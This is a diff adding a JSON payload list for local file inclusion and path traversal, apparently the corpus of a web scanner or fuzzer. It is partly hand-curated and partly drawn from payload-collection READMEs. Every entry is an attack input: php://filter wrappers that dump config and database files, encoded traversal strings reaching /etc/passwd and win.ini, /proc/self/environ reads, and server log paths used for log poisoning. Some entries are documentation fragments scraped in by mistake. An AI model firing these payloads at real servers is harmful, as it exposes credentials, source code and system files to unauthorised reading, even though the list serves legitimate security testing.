@@ -1,0 +1,190 @@
+{
+ "class": "lfi",
+ "entries": [
+  {
+   "payload": "php://filter/convert.base64-encode/resource=config.php",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "php://filter/convert.base64-encode/resource=.htaccess",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "php://filter/read=convert.base64-encode/resource=/etc/passwd",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "php://filter/convert.base64-encode/resource=../../config/database.php",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "php://filter/resource=/etc/passwd",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "/proc/self/environ",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "/proc/self/cmdline",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "/proc/self/root/etc/passwd",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "..%252f..%252f..%252fetc%252fpasswd",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "..%25c0%25af..%25c0%25afetc/passwd",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "..%5c..%5c..%5cboot.ini",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "..\\..\\..\\boot.ini",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "/var/log/apache2/access.log",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "/var/log/httpd/access_log",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "/var/log/nginx/access.log",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "....//....//....//var/log/apache2/access.log",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd",
+   "dialect": "traversal",
+   "source": "Directory Traversal/README.md"
+  },
+  {
+   "payload": "/etc/passwd",
+   "dialect": "inclusion",
+   "source": "File Inclusion/README.md"
+  },
+  {
+   "payload": "php://filter",
+   "dialect": "wrappers",
+   "source": "File Inclusion/Wrappers.md"
+  },
+  {
+   "payload": "win.ini",
+   "dialect": "traversal",
+   "source": "Directory Traversal/README.md"
+  },
+  {
+   "payload": "../../../../../../../../../../etc/passwd%00",
+   "dialect": "inclusion",
+   "source": "File Inclusion/README.md"
+  },
+  {
+   "payload": "php://filter/read=string.rot13/resource=index.php",
+   "dialect": "wrappers",
+   "source": "File Inclusion/Wrappers.md"
+  },
+  {
+   "payload": "../.../.../.../.../.../.../.../.../windows/win.ini",
+   "dialect": "traversal",
+   "source": "Directory Traversal/README.md"
+  },
+  {
+   "payload": "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
+   "dialect": "wrappers",
+   "source": "File Inclusion/Wrappers.md"
+  },
+  {
+   "payload": "php://filter/convert.base64-encode/resource=index.php",
+   "dialect": "wrappers",
+   "source": "File Inclusion/Wrappers.md"
+  },
+  {
+   "payload": "../../../../../../../../../../../etc/passwd%00index.htm",
+   "dialect": "traversal",
+   "source": "Directory Traversal/README.md"
+  },
+  {
+   "payload": "php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s",
+   "dialect": "wrappers",
+   "source": "File Inclusion/Wrappers.md"
+  },
+  {
+   "payload": "proc/self/environ",
+   "dialect": "traversal",
+   "source": "Directory Traversal/README.md"
+  },
+  {
+   "payload": "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php",
+   "dialect": "wrappers",
+   "source": "File Inclusion/Wrappers.md"
+  },
+  {
+   "payload": "proc/self/cwd/index.php",
+   "dialect": "traversal",
+   "source": "Directory Traversal/README.md"
+  },
+  {
+   "payload": "/etc/passwd 'PREFIX' 'SUFFIX' 1000",
+   "dialect": "wrappers",
+   "source": "File Inclusion/Wrappers.md"
+  },
+  {
+   "payload": "proc/self/cwd/main.py",
+   "dialect": "traversal",
+   "source": "Directory Traversal/README.md"
+  },
+  {
+   "payload": "/etc/passwd # dump a file!",
+   "dialect": "wrappers",
+   "source": "File Inclusion/Wrappers.md"
+  },
+  {
+   "payload": "C:\\Windows\\win.ini",
+   "dialect": "traversal",
+   "source": "Directory Traversal/README.md"
+  }
+ ]
+}
